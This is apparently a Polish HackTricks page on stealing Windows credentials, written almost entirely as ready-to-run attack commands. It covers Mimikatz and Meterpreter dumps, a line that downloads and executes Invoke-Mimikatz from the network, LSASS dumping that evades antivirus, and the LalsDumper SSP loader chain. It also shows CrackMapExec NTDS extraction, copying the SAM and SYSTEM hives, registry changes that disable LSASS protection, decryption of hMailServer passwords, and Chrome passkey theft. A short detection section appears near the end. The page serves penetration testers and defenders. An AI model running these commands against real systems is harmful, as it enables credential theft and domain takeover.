# Kradzież poświadczeń systemu Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz potrafi robić, na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się tutaj o niektórych możliwych zabezpieczeniach poświadczeń.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyodrębnienie niektórych poświadczeń.**

## Poświadczenia z Meterpreter

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **utworzonego przeze mnie**, aby **wyszukać hasła i hashe** na komputerze ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoft**, Defender go nie wykrywa.\
Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wyodrębnienia** **danych uwierzytelniających lokalnie** ze zrzutu.

Możesz również użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre programy **AV** mogą **wykryć** jako **złośliwe** użycie **procdump.exe do zrzucenia lsass.exe**, ponieważ **wykrywają** ciągi **„procdump.exe” i „lsass.exe”**. Dlatego bardziej **dyskretnym** rozwiązaniem jest przekazanie do procdump jako **argumentu** **PID-u** lsass.exe **zamiast** jego **nazwy lsass.exe.**

### Zrzucanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Ta biblioteka DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, przeznaczoną do wywoływania za pomocą `rundll32.exe`.\
Użycie dwóch pierwszych argumentów nie ma znaczenia, natomiast trzeci jest podzielony na trzy komponenty. Pierwszy komponent stanowi identyfikator procesu, który ma zostać zrzucony, drugi określa lokalizację pliku zrzutu, a trzeci musi być dokładnie słowem **full**. Nie istnieją alternatywne opcje.\
Po przeanalizowaniu tych trzech komponentów biblioteka DLL tworzy plik zrzutu i zapisuje w nim pamięć określonego procesu.\
Wykorzystanie **comsvcs.dll** umożliwia zrzucenie procesu lsass, eliminując tym samym konieczność przesyłania i uruchamiania procdump. Ta metoda została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Do wykonania tej czynności używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ten proces możesz zautomatyzować za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij opcję Menedżer zadań
2. Kliknij opcję Więcej szczegółów
3. Na karcie Procesy znajdź proces „Local Security Authority Process”
4. Kliknij prawym przyciskiem myszy proces „Local Security Authority Process” i kliknij opcję „Utwórz plik zrzutu”.

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny wchodzący w skład pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpowanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do dumpowania procesów chronionych, które obsługuje obfuskowanie memory dump oraz przesyłanie go na zdalne stacje robocze bez zapisywania go na dysku.

**Kluczowe funkcje**:

1. Omijanie ochrony PPL
2. Obfuskowanie plików memory dump w celu ominięcia mechanizmów wykrywania opartych na sygnaturach w Defenderze
3. Przesyłanie memory dump za pomocą metod uploadu RAW i SMB bez zapisywania go na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – zrzut LSASS oparty na SSP bez MiniDumpWriteDump

Ink Dragon dostarcza trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc hooki EDR na tym API nigdy się nie aktywują:

1. **Loader Stage 1 (`lals.exe`)** – wyszukuje w `fdp.dll` placeholder składający się z 32 małych liter `d`, zastępuje go absolutną ścieżką do `rtu.txt`, zapisuje spatchowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Wymusza to załadowanie przez **LSASS** złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 wewnątrz LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka DLL odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20` i mapuje zdekodowany blob w pamięci, a następnie przekazuje mu wykonanie.
3. **Stage 3 dumper** – zmapowany payload ponownie implementuje logikę MiniDump, używając **direct syscalls** rozwiązywanych na podstawie zahashowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje skompresowany dump LSASS do pliku i zamyka uchwyt, aby exfiltration mogła nastąpić później.

Uwagi operatora:

* Umieść `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 zastępuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc rozdzielenie tych plików przerywa cały łańcuch.
* Rejestracja odbywa się przez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie wstępnie ustawić tę wartość, aby LSASS ładował ponownie SSP przy każdym uruchomieniu systemu.
* Pliki `%TEMP%\*.ddt` to skompresowane dumpy. Zdekompresuj je lokalnie, a następnie przekaż do Mimikatz/Volatility w celu ekstrakcji poświadczeń.
* Uruchomienie `lals.exe` wymaga uprawnień administratora/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po powrocie z tego wywołania LSASS transparentnie ładuje rogue SSP i wykonuje Stage 2.
* Usunięcie biblioteki DLL z dysku nie powoduje jej usunięcia z LSASS. Usuń wpis w rejestrze i zrestartuj LSASS (uruchom ponownie system) albo pozostaw go w celu zapewnienia długoterminowej persistence.

## CrackMapExec

### Dumpowanie hashy SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Zrzucanie sekretów LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut NTDS.dit z docelowego kontrolera domeny
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump historii haseł NTDS.dit z docelowego DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież SAM & SYSTEM

Te pliki powinny znajdować się w _C:\windows\system32\config\SAM_ oraz _C:\windows\system32\config\SYSTEM._ Nie można ich jednak po prostu skopiować w zwykły sposób, ponieważ są chronione.

### Z rejestru

Najłatwiejszym sposobem na kradzież tych plików jest uzyskanie ich kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Za pomocą tej usługi możesz kopiować chronione pliki. Wymagane są uprawnienia Administratora.

#### Using vssadmin

Plik binarny vssadmin jest dostępny wyłącznie w wersjach Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz zrobić to samo z poziomu **Powershell**. Jest to przykład **kopiowania pliku SAM** (używany dysk to „C:”, a plik jest zapisywany w C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na koniec możesz również użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię plików SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i zawiera kluczowe dane dotyczące obiektów użytkowników, grup oraz ich członkostwa. To właśnie w nim przechowywane są **password hashes** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych przechowywane są trzy główne tabele:

- **Data Table**: Tabela ta przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
- **Link Table**: Przechowuje informacje o relacjach, takich jak członkostwo w grupach.
- **SD Table**: Znajdują się tutaj **security descriptors** każdego obiektu, zapewniające bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a korzysta z niego _lsass.exe_. W rezultacie **część** pliku **NTDS.dit** może znajdować się w pamięci procesu **`lsass`** (prawdopodobnie można znaleźć tam ostatnio używane dane z powodu zwiększenia wydajności dzięki zastosowaniu **cache**).

#### Odszyfrowywanie hashy znajdujących się w NTDS.dit

Hash jest szyfrowany 3 razy:

1. Odszyfrowanie Password Encryption Key (**PEK**) za pomocą **BOOTKEY** i **RC4**.
2. Odszyfrowanie **hasha** za pomocą **PEK** i **RC4**.
3. Odszyfrowanie **hasha** za pomocą **DES**.

**PEK** ma **taką samą wartość** na **każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** za pomocą **BOOTKEY** z **pliku SYSTEM kontrolera domeny (jest inny dla poszczególnych kontrolerów domeny)**. Dlatego aby uzyskać credentials z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz również użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii **SYSTEM file** (ponownie użyj sztuczki [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Extracting hashes from NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz również **automatycznie je wyodrębnić** przy użyciu prawidłowego użytkownika domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na koniec można również użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, lecz także całe obiekty i ich atrybuty, co umożliwia dalsze wydobywanie informacji, gdy surowy plik NTDS.dit został już pozyskany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive `SYSTEM` jest opcjonalny, ale umożliwia odszyfrowanie sekretów (hashy NT i LM, dodatkowych poświadczeń, takich jak hasła w postaci jawnego tekstu, klucze Kerberos lub trust, historia haseł NT i LM). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwa, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami trustów...

## Lazagne

Pobierz binary z [tego miejsca](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego binary do wyodrębniania credentials z różnych programów.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może służyć do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnianie poświadczeń z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij dane uwierzytelniające z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom go**, a hasła zostaną wyodrębnione.

## Zbieranie informacji o bezczynnych sesjach RDP i osłabianie mechanizmów bezpieczeństwa

FinalDraft RAT autorstwa Ink Dragon zawiera tasker `DumpRDPHistory`, którego techniki są przydatne dla każdego red-teamera:

### Zbieranie telemetrii w stylu DumpRDPHistory

* **Docelowe systemy wychodzących połączeń RDP** – przeanalizuj każdy user hive pod adresem `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` oraz timestamp ostatniej modyfikacji. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Ślady przychodzących połączeń RDP** – odczytaj log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem Event IDs **21** (pomyślne logowanie) i **25** (rozłączenie), aby ustalić, kto administrował danym systemem:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już ustalisz, który Domain Admin regularnie się łączy, wykonaj dump LSASS (za pomocą LalsDumper/Mimikatz), dopóki jego **rozłączona** sesja nadal istnieje. CredSSP + NTLM fallback pozostawia w LSASS ich verifier i tokeny, które można następnie replayować przez SMB/WinRM, aby przejąć `NTDS.dit` lub zapewnić persistence na kontrolerach domeny.

### Obniżenia poziomu zabezpieczeń rejestru ukierunkowane przez FinalDraft

Ten sam implant modyfikuje również kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivoting w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy DC jest online, zapewniając atakującym kolejne wbudowane konto z wysokimi uprawnieniami.
* `RunAsPPL=0` usuwa ochronę LSASS PPL, dzięki czemu dostęp do pamięci staje się trywialny dla dumperów, takich jak LalsDumper.

## Poświadczenia bazy danych hMailServer (po przejęciu)

hMailServer przechowuje hasło do DB w pliku `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` w sekcji `[Database] Password=`. Wartość jest zaszyfrowana algorytmem Blowfish przy użyciu statycznego klucza `THIS_KEY_IS_NOT_SECRET` oraz zamiany kolejności bajtów w 4-bajtowych słowach. Użyj ciągu hex z pliku INI wraz z tym fragmentem Pythona:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mając hasło w postaci jawnej, skopiuj bazę danych SQL CE, aby uniknąć blokad pliku, załaduj dostawcę 32-bitowego i w razie potrzeby wykonaj aktualizację przed odpytywaniem o hashe:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolumna `accountpassword` używa formatu hashy hMailServer (tryb hashcat `1421`). Cracking tych wartości może dostarczyć ponownie wykorzystywalnych danych uwierzytelniających do pivotów WinRM/SSH.
## Przechwytywanie LSA Logon Callback (LsaApLogonUserEx2)

Niektóre narzędzia przechwytują **plaintext logon passwords**, interceptując callback LSA logon `LsaApLogonUserEx2`. Idea polega na hookowaniu lub opakowaniu callbacku pakietu uwierzytelniania, aby dane uwierzytelniające zostały przechwycone **podczas logowania** (przed hashowaniem), a następnie zapisane na dysku lub zwrócone operatorowi. Zwykle jest to implementowane jako helper, który wstrzykuje się do LSA lub rejestruje w nim, a następnie rejestruje każde pomyślne interactive/network logon event wraz z nazwą użytkownika, domeną i hasłem.

Uwagi operacyjne:
- Wymaga local admin/SYSTEM do załadowania helpera w ścieżce uwierzytelniania.
- Przechwycone dane uwierzytelniające pojawiają się tylko wtedy, gdy nastąpi logon (interactive, RDP, service lub network logon, zależnie od hooka).

## Zapisane dane uwierzytelniające połączeń SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane dumpers mogą sparsować ten plik i odzyskać zapisane dane uwierzytelniające SQL. W shellach, które zwracają wyłącznie output poleceń, plik jest często eksfiltrowany przez zakodowanie go jako Base64 i wyświetlenie na stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Po stronie operatora odbuduj plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Kradzież poświadczeń Passkeys / WebAuthn z Chrome w systemie Windows

Jeśli uzyskano **code execution** jako **użytkownik-ofiara** na hoście Windows z użyciem **Chrome + zsynchronizowanych passkeys w Google Password Manager**, passkeys stają się interesującym celem post-exploitation, nawet **bez uprawnień administratora/SYSTEM**.

### Interesujące lokalne artefakty
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** przechowuje zakodowane w protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces działający w kontekście tego samego użytkownika może wyliczyć **RP ID**, **nazwę użytkownika**, **ID poświadczenia** oraz zaszyfrowany materiał klucza prywatnego zsynchronizowanych passkeys.
- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`**, oraz opakowany sekret używany do odzyskiwania zsynchronizowanych poświadczeń.

Szybki triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Obiekty kluczy powiązanych z TPM nadal mogą być wykorzystywane jako lokalna wyrocznia podpisująca

Jeśli przeglądarka eksportuje klucz tożsamości wspierany przez TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten obiekt blob w stanie dostępnym dla użytkownika, malware **nie musi** wyodrębniać surowego klucza prywatnego. Może po prostu ponownie zaimportować obiekt blob na **tej samej maszynie** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Oznacza to, że **hardware binding zapobiega eksportowi poza urządzenie, ale nie uniemożliwia użycia przez tego samego użytkownika na przejętym endpointcie**.

### Praktyczne ścieżki nadużyć

1. **Pass-ta-key / device-identity relay**
- Wylicz `WebauthnCredentialSpecifics` z Chrome LevelDB.
- Rozpocznij logowanie za pomocą passkey i uzyskaj świeże wyzwanie WebAuthn.
- Użyj skradzionego bloba `wrapped_identity_private_key` na TPM ofiary, aby podpisać binding żądania cloud-authenticator.
- Przekaż otrzymane assertion do relying party.
- Jest to szczególnie wartościowe, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertion z **`UV=0`**.
2. **Pending UV-key hijack**
- Wymuś ponowne onboardowanie, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
- Jeśli onboardowanie pozostawi urządzenie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego klucz publiczny UV.
- Jeśli provider nie weryfikuje attestation / pochodzenia z secure hardware dla nowego klucza UV, późniejsze podpisy z klucza atakującego są traktowane jako **`UV=1`**.
3. **Master-secret / SDS recovery theft**
- Wymuś recovery lub ponowne dołączenie, aby Chrome pobrał zsynchronizowany master secret passkey.
- Obserwuj ponowne utworzenie lub modyfikację `passkey_enclave_state`, a następnie wykonaj dump pamięci Chrome, gdy jawny **security domain secret (SDS)** znajduje się w pamięci.
- Użyj odzyskanego SDS do odszyfrowania zaszyfrowanych pól w każdym rekordzie `WebauthnCredentialSpecifics` i odzyskaj przenośne klucze prywatne WebAuthn.

### DFIR / pomysły na detekcję

- Monitoruj **usuwanie i ponowne tworzenie** `passkey_enclave_state`.
- Generuj alerty o nietypowym dostępie procesów innych niż przeglądarka do Chrome **`Sync Data\LevelDB`**.
- Generuj alerty o **zrzutach pamięci Chrome** lub podejrzanym dostępie do pamięci między procesami.
- Zbadaj powtarzające się monity o **Google Password Manager recovery PIN** lub nieoczekiwane ponowne onboardowanie.
- Pamiętaj, że WebAuthn **`signCount`** często nie jest przydatne w przypadku zsynchronizowanych passkey, ponieważ może pozostawać stałe, dlatego klasyczna detekcja klonów jest słaba.

## References

- [Unit 42 – Dochodzenie w sprawie wieloletnich, niewykrytych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → deszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: ujawnienie sieci relay i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: nowa powierzchnia ataku w uwierzytelnianiu bez haseł](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / magazyn kluczy CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
